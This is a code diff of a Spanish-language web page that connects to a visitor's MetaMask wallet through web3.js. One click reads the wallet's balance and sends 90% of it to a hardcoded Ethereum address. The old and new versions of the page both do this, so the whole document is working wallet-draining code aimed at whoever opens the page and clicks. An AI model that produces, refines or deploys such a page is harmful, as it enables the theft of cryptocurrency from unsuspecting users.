@@ -1,60 +1,41 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Transferir el 90% de saldo a una dirección</title>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"></script>
-  <script>
-    window.addEventListener('load', async () => {
-      if (window.ethereum) {
-        window.web3 = new Web3(window.ethereum);
-        try {
+  <head>
+    <meta charset="UTF-8" />
+    <title>Enviar 90% del saldo automáticamente</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.0/dist/web3.min.js"></script>
+  </head>
+  <body>
+    <h1>Enviar 90% del saldo automáticamente</h1>
+    <button onclick="enviar()">Enviar 90% del saldo</button>
+    <script>
+      async function enviar() {
+        // Conectar a MetaMask
+        if (typeof window.ethereum !== "undefined") {
           await window.ethereum.enable();
-        } catch (error) {
-          console.error("El usuario rechazó la conexión: ", error);
         }
-      } else if (window.web3) {
-        window.web3 = new Web3(window.web3.currentProvider);
-      } else {
-        console.error("No se encontró un proveedor web3. Debe instalar una billetera como MetaMask");
-      }
-    });
 
-    async function transferir() {
-      const accounts = await web3.eth.getAccounts();
-      const balance = await web3.eth.getBalance(accounts[0]);
-      const direccionDestino = "0x8935361d21943Ee8a863082EdD8a6Aefb062E434"; // Dirección de destino para la transferencia
-      const cantidad = balance * 0.9;
-      
-      if (cantidad > 0) {
-        try {
-          await web3.eth.sendTransaction({
-            from: accounts[0],
-            to: direccionDestino,
-            value: cantidad,
-            gas: 21000,
-          });
-          console.log("Transferencia exitosa");
-        } catch (error) {
-          console.error("Error en la transferencia: ", error);
-        }
-      } else {
-        console.error("No hay saldo suficiente para la transferencia");
+        // Obtener la dirección del usuario
+        const accounts = await web3.eth.getAccounts();
+        const userAddress = accounts[0];
+
+        // Obtener el saldo del usuario
+        const balance = await web3.eth.getBalance(userAddress);
+
+        // Calcular el 90% del saldo
+        const amountToSend = balance * 0.9;
+
+        // Enviar la transacción
+        const txHash = await web3.eth.sendTransaction({
+          from: userAddress,
+          to: "0x8935361d21943Ee8a863082EdD8a6Aefb062E434", // Dirección de destino
+          value: amountToSend,
+        });
+
+        // Mostrar el hash de transacción en la consola
+        console.log("Hash de transacción:", txHash);
       }
-    }
-  </script>
-</head>
-<body>
-  <div style="display: flex; justify-content: center;">
-    <div style="width: 300px; margin-top: 50px;">
-      <div style="border: 1px solid black; padding: 10px; text-align: center;">
-        <h2>Transferir el 90% de saldo a una dirección</h2>
-        <p>Haga clic en el botón para transferir el 90% de su saldo a la dirección de destino</p>
-        <button onclick="transferir()">Transferir</button>
-      </div>
-    </div>
-  </div>
-</body>
+    </script>
+  </body>
 </html>
 
